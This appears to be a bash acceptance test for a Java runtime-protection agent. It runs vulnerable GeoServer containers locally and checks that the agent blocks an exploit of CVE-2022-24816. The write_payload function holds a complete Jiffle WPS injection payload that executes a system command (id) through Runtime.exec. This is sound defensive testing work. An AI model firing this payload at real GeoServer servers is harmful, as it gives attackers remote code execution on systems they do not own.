#!/usr/bin/env bash
set -euo pipefail

cd "$(dirname "$0")/.."

image="${OHMYRASP_VULHUB_GEOSERVER_24816_IMAGE:-vulhub/geoserver:2.17.2}"
baseline_name="${OHMYRASP_VULHUB_GEOSERVER_24816_BASELINE_NAME:-ohmyrasp-vulhub-geoserver24816-baseline}"
protected_name="${OHMYRASP_VULHUB_GEOSERVER_24816_PROTECTED_NAME:-ohmyrasp-vulhub-geoserver24816-protected}"
baseline_port="${OHMYRASP_VULHUB_GEOSERVER_24816_BASELINE_PORT:-19482}"
protected_port="${OHMYRASP_VULHUB_GEOSERVER_24816_PROTECTED_PORT:-19483}"
host_agent_jar="$(pwd)/agent-java17/build/libs/ohmyrasp-agent-java17.jar"
baseline_dir="logs/vulhub-geoserver-2.17.2-24816-java17-baseline"
protected_dir="logs/vulhub-geoserver-2.17.2-24816-java17-protected"
payload_dir="logs/vulhub-geoserver-2.17.2-24816-java17-payload"
payload_xml="${payload_dir}/jiffle-wps.xml"
protected_log="${protected_dir}/events.jsonl"

copy_logs() {
  local name="$1"
  local dir="$2"
  if docker inspect "$name" >/dev/null 2>&1; then
    docker logs "$name" > "${dir}/container.log" 2>&1 || true
  fi
}

cleanup() {
  copy_logs "$baseline_name" "$baseline_dir"
  copy_logs "$protected_name" "$protected_dir"
  docker rm -f "$baseline_name" "$protected_name" >/dev/null 2>&1 || true
}
trap cleanup EXIT

write_payload() {
  cat > "$payload_xml" <<'XML'
<?xml version="1.0" encoding="UTF-8"?>
<wps:Execute version="1.0.0" service="WPS" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns="http://www.opengis.net/wps/1.0.0" xmlns:wfs="http://www.opengis.net/wfs" xmlns:wps="http://www.opengis.net/wps/1.0.0" xmlns:ows="http://www.opengis.net/ows/1.1" xmlns:gml="http://www.opengis.net/gml" xmlns:ogc="http://www.opengis.net/ogc" xmlns:wcs="http://www.opengis.net/wcs/1.1.1" xmlns:xlink="http://www.w3.org/1999/xlink" xsi:schemaLocation="http://www.opengis.net/wps/1.0.0 http://schemas.opengis.net/wps/1.0.0/wpsAll.xsd">
<ows:Identifier>ras:Jiffle</ows:Identifier>
<wps:DataInputs>
    <wps:Input>
    <ows:Identifier>coverage</ows:Identifier>
    <wps:Data>
        <wps:ComplexData mimeType="application/arcgrid"><![CDATA[ncols 720 nrows 360 xllcorner -180 yllcorner -90 cellsize 0.5 NODATA_value -9999  316]]></wps:ComplexData>
    </wps:Data>
    </wps:Input>
    <wps:Input>
    <ows:Identifier>script</ows:Identifier>
    <wps:Data>
        <wps:LiteralData>dest = y() - (500); // */ public class Double {    public static double NaN = 0;  static { try {  java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec("id").getInputStream())); String line = null; String allLines = " - "; while ((line = reader.readLine()) != null) { allLines += line; } throw new RuntimeException(allLines);} catch (java.io.IOException e) {} }} /**</wps:LiteralData>
    </wps:Data>
    </wps:Input>
    <wps:Input>
    <ows:Identifier>outputType</ows:Identifier>
    <wps:Data>
        <wps:LiteralData>DOUBLE</wps:LiteralData>
    </wps:Data>
    </wps:Input>
</wps:DataInputs>
<wps:ResponseForm>
    <wps:RawDataOutput mimeType="image/tiff">
    <ows:Identifier>result</ows:Identifier>
    </wps:RawDataOutput>
</wps:ResponseForm>
</wps:Execute>
XML
}

verify_image_java17() {
  docker run --rm --entrypoint java "$image" -version > "${payload_dir}/image-java-version.txt" 2>&1
  if ! grep -Fq 'version "17.' "${payload_dir}/image-java-version.txt"; then
    cat "${payload_dir}/image-java-version.txt" >&2
    echo "GeoServer image did not report a Java 17 runtime" >&2
    exit 1
  fi
}

start_geoserver() {
  local name="$1"
  local port="$2"
  shift 2
  docker run -d --name "$name" \
    -p "${port}:8080" \
    "$@" \
    "$image" >/dev/null
}

wait_for_geoserver() {
  local name="$1"
  local port="$2"
  local dir="$3"
  local status
  for attempt in $(seq 1 180); do
    status="$(
      curl -sS --max-time 8 \
        -o "${dir}/readiness-${attempt}.html" \
        -w '%{http_code}' \
        "http://127.0.0.1:${port}/geoserver/web/" 2>"${dir}/readiness-${attempt}.err" || true
    )"
    printf 'readiness_attempt=%s status=%s\n' "$attempt" "$status" >> "${dir}/attempts.log"
    if [[ "$status" == "200" || "$status" == "302" ]]; then
      return
    fi
    if ! docker ps --filter "name=${name}" --filter status=running --format '{{.Names}}' \
      | grep -Fq "$name"; then
      docker logs "$name" >&2 || true
      echo "GeoServer container ${name} stopped before readiness" >&2
      exit 1
    fi
    sleep 2
  done
  docker logs "$name" >&2 || true
  echo "GeoServer did not become ready on ${port}" >&2
  exit 1
}

post_jiffle() {
  local port="$1"
  local output="$2"
  curl -sS --max-time 90 \
    -o "$output" \
    -w '%{http_code}' \
    -X POST \
    -H 'Content-Type: application/xml' \
    --data-binary "@${payload_xml}" \
    "http://127.0.0.1:${port}/geoserver/wms" || true
}

detection_count() {
  grep -Ec '"event":"ohmyrasp-detection"' "$protected_log" 2>/dev/null || true
}

jiffle_block_count() {
  grep -Ec '"algorithm":"java17_command_execution_exploit_primitive".*"action":"block".*"message":"Jiffle runtime reached a Java 17 process sink"' \
    "$protected_log" 2>/dev/null || true
}

assert_no_detection() {
  if [[ "$(detection_count)" != "0" ]]; then
    cat "$protected_log" >&2
    echo "protected GeoServer produced a detection before malicious Jiffle WPS traffic" >&2
    exit 1
  fi
}

run_baseline() {
  start_geoserver "$baseline_name" "$baseline_port"
  wait_for_geoserver "$baseline_name" "$baseline_port" "$baseline_dir"

  local status
  status="$(post_jiffle "$baseline_port" "${baseline_dir}/jiffle-wps.xml")"
  printf 'jiffle_status=%s\n' "$status" >> "${baseline_dir}/attempts.log"
  if [[ "$status" != "200" ]] || ! grep -Fq 'uid=' "${baseline_dir}/jiffle-wps.xml"; then
    cat "${baseline_dir}/jiffle-wps.xml" >&2 || true
    echo "baseline GeoServer Jiffle WPS request did not expose command output" >&2
    exit 1
  fi
  copy_logs "$baseline_name" "$baseline_dir"
  docker rm -f "$baseline_name" >/dev/null 2>&1 || true
}

run_protected() {
  start_geoserver "$protected_name" "$protected_port" \
    -v "${host_agent_jar}:/opt/ohmyrasp/ohmyrasp-agent-java17.jar:ro" \
    -v "$(pwd)/${protected_dir}:/opt/ohmyrasp/logs" \
    -e JAVA_OPTS="-javaagent:/opt/ohmyrasp/ohmyrasp-agent-java17.jar -Dohmyrasp.java17.log=/opt/ohmyrasp/logs/events.jsonl -Dohmyrasp.java17.block=true"

  for attempt in $(seq 1 120); do
    if grep -Fq '"event":"ohmyrasp-java17-agent-start"' "$protected_log"; then
      printf 'agent_start_attempt=%s\n' "$attempt" >> "${protected_dir}/attempts.log"
      break
    fi
    sleep 1
  done
  if ! grep -Fq '"event":"ohmyrasp-java17-agent-start"' "$protected_log"; then
    cat "$protected_log" >&2 || true
    echo "missing Java17 agent startup event for GeoServer" >&2
    exit 1
  fi

  wait_for_geoserver "$protected_name" "$protected_port" "$protected_dir"
  assert_no_detection

  local previous_blocks
  local current_blocks
  local status
  previous_blocks="$(jiffle_block_count)"
  status="$(post_jiffle "$protected_port" "${protected_dir}/jiffle-wps.xml")"
  printf 'jiffle_status=%s\n' "$status" >> "${protected_dir}/attempts.log"
  if grep -Fq 'uid=' "${protected_dir}/jiffle-wps.xml"; then
    cat "${protected_dir}/jiffle-wps.xml" >&2 || true
    echo "protected GeoServer Jiffle WPS response still exposed command output" >&2
    exit 1
  fi
  for attempt in $(seq 1 30); do
    current_blocks="$(jiffle_block_count)"
    if (( current_blocks > previous_blocks )); then
      copy_logs "$protected_name" "$protected_dir"
      docker rm -f "$protected_name" >/dev/null 2>&1 || true
      return
    fi
    sleep 1
  done
  cat "$protected_log" >&2 || true
  cat "${protected_dir}/jiffle-wps.xml" >&2 || true
  echo "missing Java17 Jiffle runtime block event for GeoServer CVE-2022-24816" >&2
  exit 1
}

docker run --rm -v "$(pwd):/workspace" -w /workspace gradle:jdk25 \
  gradle --no-daemon :agent-java17:agentJava17Jar

rm -rf "$baseline_dir" "$protected_dir" "$payload_dir"
mkdir -p "$baseline_dir" "$protected_dir" "$payload_dir"
: > "$protected_log"
chmod 666 "$protected_log"
write_payload
verify_image_java17

docker rm -f "$baseline_name" "$protected_name" >/dev/null 2>&1 || true

run_baseline
run_protected

echo "Vulhub GeoServer CVE-2022-24816 Java17 acceptance passed"
